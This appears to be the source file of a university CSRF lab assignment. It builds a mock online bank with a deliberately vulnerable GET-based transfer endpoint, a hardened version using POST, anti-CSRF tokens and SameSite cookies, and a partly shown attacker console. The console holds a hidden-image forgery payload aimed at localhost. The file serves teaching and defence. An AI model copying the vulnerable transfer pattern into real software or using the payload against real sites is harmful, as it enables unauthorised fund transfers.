/**
 * =========================================================================================
 * INDIAN INSTITUTE OF INFORMATION TECHNOLOGY ALLAHABAD (IIITA)
 * DEPARTMENT OF INFORMATION TECHNOLOGY
 * CYBER SECURITY (IT-30001) | AUTUMN SEMESTER 2026
 * INSTRUCTOR: DR. SOUMYADEV MAITY
 * 
 * ASSIGNMENT: WEB SERVER SECURITY - EXPLOITATION AND MITIGATION
 * VULNERABILITY CATEGORY: CROSS-SITE REQUEST FORGERY (CSRF)
 * ASSIGNED VARIANT:       GET-BASED FORGED ACTION
 * 
 * ARCHITECTURE (TWO-SIDED ARCHITECTURE ACROSS 3 PORTS):
 * -----------------------------------------------------------------------------------------
 * 1. SIDE 1: ATTACKER DELIVERY PLATFORM & RECON CONSOLE (Port 4000)
 *    - External adversary website hosting phishing trap & hidden GET attack payloads
 *    - Real-time telemetry log & click tracker
 * 
 * 2. SIDE 2: TARGET APPLICATION (ONLINE BANKING PORTAL)
 *    - Port 3001 (Vulnerable Instance): Deliberately flawed; processes state-changing
 *      fund transfers over HTTP GET relying purely on ambient session cookies.
 *    - Port 3002 (Hardened Instance): Neutralizes the vulnerability by strictly
 *      rejecting state-changing GETs (HTTP 405) and enforcing POST with an Anti-CSRF
 *      Synchronizer Token and SameSite cookie protection.
 * =========================================================================================
 */

const express = require('express');
const cookieParser = require('cookie-parser');
const crypto = require('crypto');
const http = require('http');

// =========================================================================================
// IN-MEMORY DATABASE & STATE MANAGEMENT
// Separate data stores for Port 3001 (Vulnerable) and Port 3002 (Hardened)
// =========================================================================================

function createInitialDatabase() {
    return {
        users: {
            alice: { name: 'Alice Smith (Victim)', accountNo: 'AC-99214', balance: 10000.00 },
            bob: { name: 'Bob Jones (Friend)', accountNo: 'AC-55102', balance: 5000.00 },
            mallory: { name: 'Mallory Vance (Attacker)', accountNo: 'AC-13370', balance: 250.00 }
        },
        transactions: [
            { id: 1, from: 'System', to: 'alice', amount: 10000.00, timestamp: 'Initial Deposit', note: 'Account opening' },
            { id: 2, from: 'System', to: 'bob', amount: 5000.00, timestamp: 'Initial Deposit', note: 'Account opening' },
            { id: 3, from: 'System', to: 'mallory', amount: 250.00, timestamp: 'Initial Deposit', note: 'Account opening' }
        ],
        auditLogs: []
    };
}

let dbVuln = createInitialDatabase();
let dbHardened = createInitialDatabase();

// In-memory sessions
// Port 3001 uses cookie: 'apextrust_session_vuln'
// Port 3002 uses cookie: 'apextrust_session_hardened'
const sessionsVuln = new Map();
const sessionsHardened = new Map();

// Helper to initialize default sessions
function initSessions() {
    sessionsVuln.set('alice-vuln-token-99214', { username: 'alice' });
    sessionsHardened.set('alice-hardened-token-99214', {
        username: 'alice',
        csrfToken: crypto.randomBytes(24).toString('hex')
    });
}
initSessions();

// Shared helper: Record audit logs
function logAudit(db, entry) {
    db.auditLogs.unshift({
        id: db.auditLogs.length + 1,
        time: new Date().toLocaleTimeString(),
        ...entry
    });
    if (db.auditLogs.length > 20) db.auditLogs.pop();
}

// =========================================================================================
// HTML TEMPLATE HELPERS FOR BANKING PORTAL (PORTS 3001 & 3002)
// =========================================================================================

function renderBankingPortal({ port, isHardened, currentUser, db, req, csrfToken = '' }) {
    const user = db.users[currentUser] || db.users.alice;
    const badgeColor = isHardened ? '#059669' : '#dc2626';
    const badgeText = isHardened 
        ? 'PORT 3002 — HARDENED (ANTI-CSRF & STRICT HTTP VERBS)' 
        : 'PORT 3001 — VULNERABLE (ACCEPTING GET TRANSFERS, NO CSRF DEFENSE)';

    const rows = db.transactions.slice().reverse().map(tx => `
        <tr style="border-bottom: 1px solid #e2e8f0;">
            <td style="padding: 10px; font-size: 13px; color: #64748b;">#${tx.id}</td>
            <td style="padding: 10px; font-weight: 500;">${tx.from}</td>
            <td style="padding: 10px; font-weight: 500; color: ${tx.to === 'mallory' ? '#dc2626' : '#0f172a'};">${tx.to} ${tx.to === 'mallory' ? '⚠️ (Attacker)' : ''}</td>
            <td style="padding: 10px; font-weight: 600; color: ${tx.from === currentUser ? '#dc2626' : '#059669'};">
                ${tx.from === currentUser ? '-' : '+'}$${tx.amount.toFixed(2)}
            </td>
            <td style="padding: 10px; font-size: 13px; color: #64748b;">${tx.note || 'Online Transfer'}</td>
            <td style="padding: 10px; font-size: 12px; color: #94a3b8;">${tx.timestamp}</td>
        </tr>
    `).join('');

    const auditRows = db.auditLogs.slice(0, 8).map(log => {
        const isAttack = log.isAttack;
        return `
        <tr style="border-bottom: 1px solid #e2e8f0; background: ${isAttack ? (isHardened ? '#ecfdf5' : '#fef2f2') : 'transparent'};">
            <td style="padding: 8px 10px; font-size: 12px; color: #64748b;">${log.time}</td>
            <td style="padding: 8px 10px; font-size: 12px; font-family: monospace; font-weight: bold; color: ${log.method === 'GET' ? '#d97706' : '#2563eb'};">${log.method}</td>
            <td style="padding: 8px 10px; font-size: 12px; font-family: monospace;">${log.path}</td>
            <td style="padding: 8px 10px; font-size: 11px; color: #475569;">${log.origin || 'Same-Origin / Direct'}</td>
            <td style="padding: 8px 10px; font-size: 12px; font-weight: 600; color: ${log.status === 200 ? '#059669' : '#dc2626'};">
                ${log.status === 200 ? '✅ EXECUTED' : '🛡️ BLOCKED (' + log.status + ')'}
            </td>
            <td style="padding: 8px 10px; font-size: 12px; color: #334155;">${log.detail}</td>
        </tr>
        `;
    }).join('');

    return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ApexTrust NetBanking - Port ${port} (${isHardened ? 'Hardened' : 'Vulnerable'})</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f8fafc; color: #0f172a; line-height: 1.5; }
        .top-banner { background: ${badgeColor}; color: white; padding: 8px 24px; font-size: 13px; font-weight: 700; letter-spacing: 0.5px; display: flex; justify-content: space-between; align-items: center; }
        .navbar { background: #0f172a; color: white; padding: 14px 28px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .brand { font-size: 20px; font-weight: 800; letter-spacing: -0.5px; display: flex; align-items: center; gap: 8px; }
        .brand-icon { background: #3b82f6; color: white; width: 32px; height: 32px; border-radius: 6px; display: inline-flex; align-items: center; justify-content: center; font-size: 16px; font-weight: bold; }
        .user-status { display: flex; align-items: center; gap: 16px; font-size: 14px; }
        .user-pill { background: #1e293b; padding: 6px 12px; border-radius: 20px; border: 1px solid #334155; }
        .container { max-width: 1200px; margin: 24px auto; padding: 0 20px; display: grid; grid-template-columns: 1fr 1fr; gap: 24px; }
        .full-width { grid-column: span 2; }
        .card { background: white; border-radius: 10px; border: 1px solid #e2e8f0; padding: 24px; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
        .card-header { font-size: 16px; font-weight: 700; margin-bottom: 16px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #f1f5f9; padding-bottom: 10px; }
        .balance-value { font-size: 38px; font-weight: 800; color: #0f172a; margin-top: 8px; }
        .balance-sub { font-size: 13px; color: #64748b; margin-top: 4px; }
        .form-group { margin-bottom: 14px; }
        label { display: block; font-size: 13px; font-weight: 600; color: #475569; margin-bottom: 6px; }
        input, select { width: 100%; padding: 10px 12px; border: 1px solid #cbd5e1; border-radius: 6px; font-size: 14px; }
        input:focus, select:focus { outline: none; border-color: #3b82f6; box-shadow: 0 0 0 3px rgba(59,130,246,0.15); }
        .btn { display: inline-flex; align-items: center; justify-content: center; padding: 10px 18px; border-radius: 6px; font-weight: 600; font-size: 14px; cursor: pointer; text-decoration: none; border: none; transition: 0.2s; }
        .btn-primary { background: #2563eb; color: white; }
        .btn-primary:hover { background: #1d4ed8; }
        .btn-danger { background: #ef4444; color: white; }
        .btn-secondary { background: #f1f5f9; color: #334155; border: 1px solid #cbd5e1; }
        .btn-secondary:hover { background: #e2e8f0; }
        .btn-sm { padding: 4px 10px; font-size: 12px; }
        .alert-box { padding: 14px; border-radius: 6px; font-size: 13px; margin-bottom: 16px; }
        .alert-info { background: #eff6ff; border: 1px solid #bfdbfe; color: #1e40af; }
        .alert-warning { background: #fffbeb; border: 1px solid #fde68a; color: #92400e; }
        .code-chip { font-family: monospace; background: #e2e8f0; padding: 2px 6px; border-radius: 4px; font-size: 12px; }
        table { width: 100%; border-collapse: collapse; text-align: left; }
    </style>
</head>
<body>
    <div class="top-banner">
        <span>SECURITY STATUS: ${badgeText}</span>
        <span>ACADEMIC DEMONSTRATION // DR. SOUMYADEV MAITY (IT-30001)</span>
    </div>

    <nav class="navbar">
        <div class="brand">
            <span class="brand-icon">🏦</span>
            <span>ApexTrust Online NetBanking</span>
        </div>
        <div class="user-status">
            <div class="user-pill">
                👤 Authenticated as: <strong>${user.name}</strong> (${user.accountNo})
            </div>
            <a href="/reset" class="btn btn-secondary btn-sm" onclick="return confirm('Reset all balances and logs to default?');">↺ Reset Balances</a>
            <a href="http://localhost:4000" target="_blank" class="btn btn-danger btn-sm">🚨 Open Attacker Console (Port 4000)</a>
        </div>
    </nav>

    <div class="container">
        <!-- Account Overview Card -->
        <div class="card">
            <div class="card-header">
                <span>Account Overview</span>
                <span style="font-size: 12px; color: #64748b;">Savings Account Active</span>
            </div>
            <div class="balance-sub">Available Balance</div>
            <div class="balance-value">$${user.balance.toFixed(2)}</div>
            <div class="balance-sub" style="margin-top: 14px;">
                Account Holder: <strong>${user.name}</strong><br>
                Account Number: <strong>${user.accountNo}</strong><br>
                Currency: <strong>USD ($)</strong>
            </div>

            <div style="margin-top: 20px; padding: 12px; background: #f8fafc; border-radius: 6px; border: 1px dashed #cbd5e1; font-size: 12px;">
                <strong>Simulation State:</strong><br>
                • Mallory's (Attacker) Balance: <span style="font-weight: bold; color: #dc2626;">$${db.users.mallory.balance.toFixed(2)}</span><br>
                • Bob's Balance: $${db.users.bob.balance.toFixed(2)}
            </div>
        </div>

        <!-- Transfer Funds Card -->
        <div class="card">
            <div class="card-header">
                <span>Transfer Funds (Legitimate User Action)</span>
                <span style="font-size: 12px; color: #64748b;">${isHardened ? 'Secured by Token' : 'Flawed Design'}</span>
            </div>

            ${isHardened ? `
                <div class="alert-box alert-info">
                    🛡️ <strong>Mitigation Active:</strong> State-changing GET requests are rejected with <code>405 Method Not Allowed</code>. Transfers must use <code>POST</code> with a valid Anti-CSRF Synchronizer Token.
                </div>
                <form action="/api/transfer" method="POST">
                    <!-- RUBRIC (d): Anti-CSRF Synchronizer Token field -->
                    <input type="hidden" name="csrf_token" value="${csrfToken}">
                    <div class="form-group">
                        <label>Beneficiary / Recipient:</label>
                        <select name="recipient" required>
                            <option value="bob">Bob Jones (AC-55102)</option>
                            <option value="mallory">Mallory Vance (AC-13370 - Attacker)</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>Transfer Amount ($):</label>
                        <input type="number" name="amount" value="100.00" min="1" step="any" required>
                    </div>
                    <div class="form-group">
                        <label>Security Token (Synchronizer Token):</label>
                        <input type="text" value="${csrfToken}" readonly style="background: #f1f5f9; color: #64748b; font-family: monospace; font-size: 12px;">
                    </div>
                    <button type="submit" class="btn btn-primary" style="width: 100%;">Authorize Transfer (POST + CSRF Token)</button>
                </form>
            ` : `
                <div class="alert-box alert-warning">
                    ⚠️ <strong>Vulnerability Active:</strong> This endpoint accepts state-changing fund transfers via <code>GET /api/transfer?recipient=...&amount=...</code> without any Anti-CSRF token!
                </div>
                <form action="/api/transfer" method="GET">
                    <div class="form-group">
                        <label>Beneficiary / Recipient:</label>
                        <select name="recipient" required>
                            <option value="bob">Bob Jones (AC-55102)</option>
                            <option value="mallory">Mallory Vance (AC-13370 - Attacker)</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>Transfer Amount ($):</label>
                        <input type="number" name="amount" value="100.00" min="1" step="any" required>
                    </div>
                    <button type="submit" class="btn btn-primary" style="width: 100%;">Authorize Transfer (GET Request)</button>
                </form>
            `}
        </div>

        <!-- Transaction History -->
        <div class="card full-width">
            <div class="card-header">
                <span>Recent Account Transactions</span>
                <span style="font-size: 12px; color: #64748b;">Live Ledger</span>
            </div>
            <table>
                <thead>
                    <tr style="background: #f8fafc; border-bottom: 2px solid #e2e8f0; font-size: 12px; color: #475569;">
                        <th style="padding: 10px;">ID</th>
                        <th style="padding: 10px;">FROM</th>
                        <th style="padding: 10px;">TO</th>
                        <th style="padding: 10px;">AMOUNT</th>
                        <th style="padding: 10px;">DESCRIPTION</th>
                        <th style="padding: 10px;">TIMESTAMP</th>
                    </tr>
                </thead>
                <tbody>
                    ${rows}
                </tbody>
            </table>
        </div>

        <!-- Live Server Audit Logs -->
        <div class="card full-width">
            <div class="card-header">
                <span>🛡️ Security Audit Logs & Incoming Traffic Monitor</span>
                <span style="font-size: 12px; color: #64748b;">Inspecting Cross-Origin Requests</span>
            </div>
            <p style="font-size: 13px; color: #64748b; margin-bottom: 12px;">
                Every incoming request is audited below for educational clarity. Notice how cross-origin requests from the attacker site (Port 4000) show their <code>Origin</code>/<code>Referer</code> headers.
            </p>
            <table>
                <thead>
                    <tr style="background: #f8fafc; border-bottom: 2px solid #e2e8f0; font-size: 12px; color: #475569;">
                        <th style="padding: 8px 10px;">TIME</th>
                        <th style="padding: 8px 10px;">METHOD</th>
                        <th style="padding: 8px 10px;">PATH</th>
                        <th style="padding: 8px 10px;">ORIGIN / REFERER</th>
                        <th style="padding: 8px 10px;">OUTCOME</th>
                        <th style="padding: 8px 10px;">DETAILS</th>
                    </tr>
                </thead>
                <tbody>
                    ${auditRows || '<tr><td colspan="6" style="padding: 14px; text-align: center; color: #94a3b8;">No requests logged yet. Perform a transfer or launch the exploit.</td></tr>'}
                </tbody>
            </table>
        </div>
    </div>
</body>
</html>
    `;
}

// =========================================================================================
// SIDE 2A: PORT 3001 (VULNERABLE INSTANCE)
// =========================================================================================
const appVuln = express();
appVuln.use(cookieParser());
appVuln.use(express.urlencoded({ extended: true }));
appVuln.use(express.json());

// Session Middleware for Port 3001
appVuln.use((req, res, next) => {
    let sessionToken = req.cookies['apextrust_session_vuln'];
    if (!sessionToken || !sessionsVuln.has(sessionToken)) {
        sessionToken = 'alice-vuln-token-99214';
        // Setting cookie with SameSite: 'none' or default to allow cross-site demonstration
        // on localhost as an ambient credential
        res.cookie('apextrust_session_vuln', sessionToken, {
            path: '/',
            httpOnly: false,
            sameSite: 'none',
            secure: false
        });
    }
    req.session = sessionsVuln.get(sessionToken);
    req.sessionToken = sessionToken;
    next();
});

// Portal Dashboard (Port 3001)
appVuln.get('/', (req, res) => {
    const html = renderBankingPortal({
        port: 3001,
        isHardened: false,
        currentUser: req.session ? req.session.username : 'alice',
        db: dbVuln,
        req
    });
    res.send(html);
});

// Reset Endpoint for Port 3001
appVuln.get('/reset', (req, res) => {
    dbVuln = createInitialDatabase();
    res.redirect('/');
});

// =========================================================================================
// RUBRIC ITEM (a): VULNERABLE CODE PATH
// Route: GET /api/transfer (Lines ~255-295)
// FLAW IDENTIFICATION: 
// The handler executes a state-changing financial transaction on an HTTP GET request.
// It relies entirely on the ambient browser session cookie (apextrust_session_vuln)
// and lacks any proof of user intent, origin validation, or Anti-CSRF token verification.
// =========================================================================================
appVuln.get('/api/transfer', (req, res) => {
    const sender = req.session ? req.session.username : null;
    const recipient = req.query.recipient;
    const amount = parseFloat(req.query.amount);
    const origin = req.headers.origin || req.headers.referer || 'Direct/Unknown';
    const isCrossOrigin = origin.includes('4000') || !origin.includes('3001');

    // Check authentication solely by ambient cookie
    if (!sender || !dbVuln.users[sender]) {
        logAudit(dbVuln, {
            method: 'GET',
            path: req.originalUrl,
            origin,
            status: 401,
            isAttack: isCrossOrigin,
            detail: 'Unauthenticated transfer attempt rejected.'
        });
        return res.status(401).send('<h3>401 Unauthorized</h3><p>Valid session required.</p>');
    }

    // Validate parameters
    if (!recipient || isNaN(amount) || amount <= 0) {
        logAudit(dbVuln, {
            method: 'GET',
            path: req.originalUrl,
            origin,
            status: 400,
            isAttack: isCrossOrigin,
            detail: 'Bad request: Invalid recipient or transfer amount.'
        });
        return res.status(400).send('<h3>400 Bad Request</h3><p>Invalid recipient or amount.</p>');
    }

    if (dbVuln.users[sender].balance < amount) {
        logAudit(dbVuln, {
            method: 'GET',
            path: req.originalUrl,
            origin,
            status: 400,
            isAttack: isCrossOrigin,
            detail: `Insufficient balance: ${sender} attempted to transfer $${amount}.`
        });
        return res.status(400).send('<h3>400 Insufficient Funds</h3>');
    }

    // VULNERABLE STATE MUTATION: Deduct and credit
    dbVuln.users[sender].balance -= amount;
    if (!dbVuln.users[recipient]) {
        dbVuln.users[recipient] = { name: recipient, accountNo: 'EXTERNAL', balance: 0 };
    }
    dbVuln.users[recipient].balance += amount;

    // Log transaction
    dbVuln.transactions.push({
        id: dbVuln.transactions.length + 1,
        from: sender,
        to: recipient,
        amount,
        timestamp: new Date().toLocaleTimeString(),
        note: isCrossOrigin ? '🚨 FORGED GET CSRF REQUEST' : 'Legitimate User Transfer'
    });

    logAudit(dbVuln, {
        method: 'GET',
        path: req.originalUrl,
        origin,
        status: 200,
        isAttack: isCrossOrigin,
        detail: isCrossOrigin 
            ? `🚨 CSRF SUCCESS: Transferred $${amount.toFixed(2)} from ${sender} to ${recipient} via cross-site GET!`
            : `Legitimate transfer of $${amount.toFixed(2)} to ${recipient} completed.`
    });

    // If request comes from an HTML <img> tag or script, respond with a 1x1 transparent GIF or redirect
    if (req.headers.accept && req.headers.accept.includes('image')) {
        const transparentGif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
        res.writeHead(200, { 'Content-Type': 'image/gif', 'Content-Length': transparentGif.length });
        return res.end(transparentGif);
    }

    res.send(`
        <html>
        <body style="font-family: sans-serif; text-align: center; padding: 40px; background: #f8fafc;">
            <div style="background: white; border-radius: 8px; max-width: 500px; margin: auto; padding: 24px; border: 1px solid #cbd5e1;">
                <h2 style="color: #059669;">Transfer Successful!</h2>
                <p>Transferred <strong>$${amount.toFixed(2)}</strong> from <strong>${sender}</strong> to <strong>${recipient}</strong>.</p>
                <p style="color: #64748b; font-size: 13px;">Executed via HTTP GET (Vulnerable Endpoint)</p>
                <br>
                <a href="/" style="padding: 8px 16px; background: #2563eb; color: white; text-decoration: none; border-radius: 4px;">Return to Dashboard</a>
            </div>
        </body>
        </html>
    `);
});

// Also support POST for legitimate transfers on 3001 (still vulnerable because it lacks CSRF tokens)
appVuln.post('/api/transfer', (req, res) => {
    const sender = req.session ? req.session.username : null;
    const recipient = req.body.recipient;
    const amount = parseFloat(req.body.amount);
    if (sender && recipient && amount > 0 && dbVuln.users[sender].balance >= amount) {
        dbVuln.users[sender].balance -= amount;
        dbVuln.users[recipient].balance = (dbVuln.users[recipient].balance || 0) + amount;
        dbVuln.transactions.push({
            id: dbVuln.transactions.length + 1,
            from: sender,
            to: recipient,
            amount,
            timestamp: new Date().toLocaleTimeString(),
            note: 'Standard POST Transfer'
        });
    }
    res.redirect('/');
});

// JSON API endpoint to inspect state
appVuln.get('/api/status', (req, res) => {
    res.json({
        port: 3001,
        mode: 'Vulnerable',
        users: dbVuln.users,
        transactions: dbVuln.transactions,
        auditLogs: dbVuln.auditLogs
    });
});


// =========================================================================================
// SIDE 2B: PORT 3002 (HARDENED INSTANCE)
// =========================================================================================
const appHardened = express();
appHardened.use(cookieParser());
appHardened.use(express.urlencoded({ extended: true }));
appHardened.use(express.json());

// Session Middleware for Port 3002
appHardened.use((req, res, next) => {
    let sessionToken = req.cookies['apextrust_session_hardened'];
    if (!sessionToken || !sessionsHardened.has(sessionToken)) {
        sessionToken = 'alice-hardened-token-99214';
        const csrfToken = crypto.randomBytes(24).toString('hex');
        sessionsHardened.set(sessionToken, {
            username: 'alice',
            csrfToken
        });
        // Hardened cookie: SameSite=Lax (or Strict) to restrict ambient cross-site sending
        res.cookie('apextrust_session_hardened', sessionToken, {
            path: '/',
            httpOnly: true,
            sameSite: 'lax'
        });
    }
    req.session = sessionsHardened.get(sessionToken);
    req.sessionToken = sessionToken;
    next();
});

// Portal Dashboard (Port 3002)
appHardened.get('/', (req, res) => {
    const csrfToken = req.session ? req.session.csrfToken : '';
    const html = renderBankingPortal({
        port: 3002,
        isHardened: true,
        currentUser: req.session ? req.session.username : 'alice',
        db: dbHardened,
        req,
        csrfToken
    });
    res.send(html);
});

// Reset Endpoint for Port 3002
appHardened.get('/reset', (req, res) => {
    dbHardened = createInitialDatabase();
    initSessions();
    res.redirect('/');
});

// =========================================================================================
// RUBRIC ITEM (d): MITIGATION IMPLEMENTED
// Route: GET /api/transfer on Port 3002 (Lines ~400-435)
// DEFENSE MECHANISM:
// 1. Rejection of state-changing GET requests (HTTP 405 Method Not Allowed).
//    Adheres strictly to RFC 7231 (GET must remain safe and idempotent).
// 2. State mutations are restricted exclusively to POST requests.
// 3. POST requests require validation of a cryptographically random Anti-CSRF
//    Synchronizer Token tied to the authenticated user's session.
// =========================================================================================
appHardened.get('/api/transfer', (req, res) => {
    const origin = req.headers.origin || req.headers.referer || 'Direct/Unknown';
    const isCrossOrigin = origin.includes('4000') || !origin.includes('3002');
    const recipient = req.query.recipient;
    const amount = req.query.amount;

    // Defense: Explicitly refuse state changes over HTTP GET
    logAudit(dbHardened, {
        method: 'GET',
        path: req.originalUrl,
        origin,
        status: 405,
        isAttack: isCrossOrigin,
        detail: `🛡️ ATTACK DEFENDED: Blocked GET transfer attempt for recipient "${recipient}" ($${amount}). Reason: State-changing GET requests are strictly prohibited (HTTP 405 Method Not Allowed).`
    });

    res.status(405).send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>405 Method Not Allowed - ApexTrust Security</title>
            <style>
                body { font-family: sans-serif; background: #0f172a; color: #f8fafc; padding: 40px; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
                .box { background: #1e293b; border: 1px solid #334155; border-radius: 8px; max-width: 600px; padding: 32px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
                h1 { color: #ef4444; font-size: 24px; margin-bottom: 12px; }
                p { font-size: 14px; line-height: 1.6; color: #cbd5e1; }
                .code { background: #0f172a; padding: 10px; border-radius: 4px; font-family: monospace; font-size: 13px; margin: 12px 0; border: 1px solid #334155; color: #f59e0b; }
            </style>
        </head>
        <body>
            <div class="box">
                <h1>🛡️ 405 Method Not Allowed (CSRF Mitigation Active)</h1>
                <p><strong>Security Violation Detected:</strong> A state-changing operation (fund transfer) was attempted using HTTP <code>GET</code>.</p>
                <div class="code">GET ${req.originalUrl}</div>
                <p>Under the implemented defense:
                    <ul>
                        <li>HTTP GET must remain a safe, idempotent read-only method (RFC 7231).</li>
                        <li>All fund transfers must be submitted via <code>POST</code>.</li>
                        <li>All POST requests must supply a valid Anti-CSRF Synchronizer Token.</li>
                    </ul>
                </p>
                <br>
                <a href="/" style="background: #3b82f6; color: white; padding: 8px 16px; border-radius: 4px; text-decoration: none; font-size: 14px;">Return to Secure Dashboard</a>
            </div>
        </body>
        </html>
    `);
});

// Hardened POST Endpoint: Enforces Anti-CSRF Synchronizer Token
appHardened.post('/api/transfer', (req, res) => {
    const sender = req.session ? req.session.username : null;
    const recipient = req.body.recipient;
    const amount = parseFloat(req.body.amount);
    const submittedToken = req.body.csrf_token || req.headers['x-csrf-token'];
    const expectedToken = req.session ? req.session.csrfToken : null;
    const origin = req.headers.origin || req.headers.referer || 'Direct/Unknown';
    const isCrossOrigin = origin.includes('4000') || !origin.includes('3002');

    // Anti-CSRF Token Validation
    if (!submittedToken || submittedToken !== expectedToken) {
        logAudit(dbHardened, {
            method: 'POST',
            path: req.originalUrl,
            origin,
            status: 403,
            isAttack: isCrossOrigin,
            detail: '🛡️ FORBIDDEN: Anti-CSRF token missing or mismatch!'
        });
        return res.status(403).send(`
            <!DOCTYPE html>
            <html>
            <body style="font-family: sans-serif; background: #0f172a; color: #f8fafc; padding: 40px; text-align: center;">
                <h1 style="color: #ef4444;">403 Forbidden: Invalid Anti-CSRF Token</h1>
                <p>The Anti-CSRF Synchronizer token was absent or did not match the active session.</p>
                <br><a href="/" style="color: #3b82f6;">Return to Dashboard</a>
            </body>
            </html>
        `);
    }

    if (!sender || !dbHardened.users[sender]) {
        return res.status(401).send('401 Unauthorized');
    }

    if (dbHardened.users[sender].balance < amount) {
        return res.status(400).send('Insufficient funds');
    }

    // Legitimate state mutation
    dbHardened.users[sender].balance -= amount;
    if (!dbHardened.users[recipient]) {
        dbHardened.users[recipient] = { name: recipient, accountNo: 'EXTERNAL', balance: 0 };
    }
    dbHardened.users[recipient].balance += amount;

    dbHardened.transactions.push({
        id: dbHardened.transactions.length + 1,
        from: sender,
        to: recipient,
        amount,
        timestamp: new Date().toLocaleTimeString(),
        note: 'Secured POST Transfer (Validated Anti-CSRF Token)'
    });

    logAudit(dbHardened, {
        method: 'POST',
        path: req.originalUrl,
        origin,
        status: 200,
        isAttack: false,
        detail: `Verified transfer of $${amount.toFixed(2)} to ${recipient} (CSRF Token Verified).`
    });

    res.redirect('/');
});

// JSON API endpoint to inspect state
appHardened.get('/api/status', (req, res) => {
    res.json({
        port: 3002,
        mode: 'Hardened',
        users: dbHardened.users,
        transactions: dbHardened.transactions,
        auditLogs: dbHardened.auditLogs
    });
});


// =========================================================================================
// SIDE 1: PORT 4000 (ATTACKER ADVERSARY PLATFORM & RECON CONSOLE)
// =========================================================================================
const appAttacker = express();
appAttacker.use(express.urlencoded({ extended: true }));
appAttacker.use(express.json());

// Attacker live telemetry logs
let attackerTelemetry = [
    { time: 'System Boot', event: 'Adversary server listening on port 4000.', status: 'INFO' }
];

function logAttackerEvent(event, status = 'INFO') {
    attackerTelemetry.unshift({
        time: new Date().toLocaleTimeString(),
        event,
        status
    });
    if (attackerTelemetry.length > 25) attackerTelemetry.pop();
}

// Reconnaissance Console Dashboard
appAttacker.get('/', (req, res) => {
    const telemetryRows = attackerTelemetry.map(t => `
        <tr style="border-bottom: 1px solid #334155;">
            <td style="padding: 8px; font-size: 12px; color: #94a3b8; font-family: monospace;">${t.time}</td>
            <td style="padding: 8px; font-size: 12px; font-weight: bold; color: ${t.status === 'ATTACK' ? '#ef4444' : (t.status === 'SUCCESS' ? '#22c55e' : '#38bdf8')};">${t.status}</td>
            <td style="padding: 8px; font-size: 13px; color: #f1f5f9; font-family: monospace;">${t.event}</td>
        </tr>
    `).join('');

    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ShadowOps Adversary Console - Port 4000 (CSRF Platform)</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #090d16; color: #f1f5f9; line-height: 1.5; }
        .header { background: #0f172a; border-bottom: 1px solid #1e293b; padding: 16px 28px; display: flex; justify-content: space-between; align-items: center; }
        .logo { font-size: 18px; font-weight: 800; color: #f43f5e; display: flex; align-items: center; gap: 10px; font-family: monospace; }
        .badge { background: #be123c; color: white; padding: 3px 8px; border-radius: 4px; font-size: 11px; }
        .grid { max-width: 1300px; margin: 24px auto; padding: 0 20px; display: grid; grid-template-columns: 1fr 1fr; gap: 24px; }
        .full { grid-column: span 2; }
        .panel { background: #0f172a; border: 1px solid #1e293b; border-radius: 8px; padding: 22px; }
        .panel-title { font-size: 15px; font-weight: 700; color: #38bdf8; margin-bottom: 14px; text-transform: uppercase; letter-spacing: 0.5px; border-bottom: 1px solid #1e293b; padding-bottom: 8px; display: flex; justify-content: space-between; }
        .code-box { background: #020617; border: 1px solid #1e293b; border-radius: 6px; padding: 14px; font-family: 'Courier New', Courier, monospace; font-size: 13px; color: #34d399; overflow-x: auto; margin: 10px 0; }
        .btn { display: inline-flex; align-items: center; justify-content: center; padding: 10px 18px; border-radius: 6px; font-weight: 600; font-size: 13px; cursor: pointer; text-decoration: none; border: none; transition: 0.2s; }
        .btn-danger { background: #e11d48; color: white; }
        .btn-danger:hover { background: #be123c; }
        .btn-outline { background: transparent; border: 1px solid #38bdf8; color: #38bdf8; }
        .btn-outline:hover { background: #38bdf8; color: #020617; }
        table { width: 100%; border-collapse: collapse; }
        .target-card { background: #1e293b; padding: 14px; border-radius: 6px; margin-bottom: 12px; border-left: 4px solid #38bdf8; }
        .target-card.vuln { border-left-color: #ef4444; }
        .target-card.hardened { border-left-color: #10b981; }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">
            <span>☠️ SHADOW-OPS RECON CONSOLE</span>
            <span class="badge">PORT 4000 // ADVERSARY PLATFORM</span>
        </div>
        <div style="font-size: 13px; color: #94a3b8;">
            Target: <strong>ApexTrust NetBanking</strong> | Vulnerability: <strong>GET-based CSRF</strong>
        </div>
    </div>

    <div class="grid">
        <!-- Reconnaissance & Weaponization -->
        <div class="panel">
            <div class="panel-title">
                <span>Phase 1: Reconnaissance & Payload Weaponization</span>
            </div>
            <p style="font-size: 13px; color: #94a3b8; margin-bottom: 10px;">
                Reconnaissance revealed that the bank's transaction module processes fund transfers using query parameters on an HTTP GET request without CSRF tokens.
            </p>
            <div style="font-size: 12px; color: #f59e0b; margin-top: 10px; font-weight: 600;">Discovered Vulnerable Endpoint:</div>
            <div class="code-box">GET http://localhost:3001/api/transfer?recipient=mallory&amount=1500</div>

            <div style="font-size: 12px; color: #f43f5e; margin-top: 10px; font-weight: 600;">Weaponized Subresource Exploit Payload:</div>
            <div class="code-box">&lt;!-- Embedded in malicious web page --&gt;<br>&lt;img src="http://localhost:3001/api/transfer?recipient=mallory&amount=1500"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;width="0" height="0" style="display:none;" /&gt;</div>

